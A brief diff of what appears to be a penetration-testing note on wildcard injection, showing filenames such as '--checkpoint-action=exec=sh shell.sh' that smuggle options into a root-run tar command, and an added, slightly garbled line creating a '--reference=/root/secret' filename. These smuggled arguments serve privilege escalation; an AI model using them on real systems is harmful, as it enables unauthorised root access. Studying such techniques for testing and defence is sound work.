@@ -14,10 +14,9 @@ touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
 
-1. Check if file contains wildcards
- ```
-   cat /opt/backup/backup.sh
-```
+Attacker Controlled Directory 
+
+touch "--reference=/root/secret``file"   # ← filename becomes an argument
 
 
 
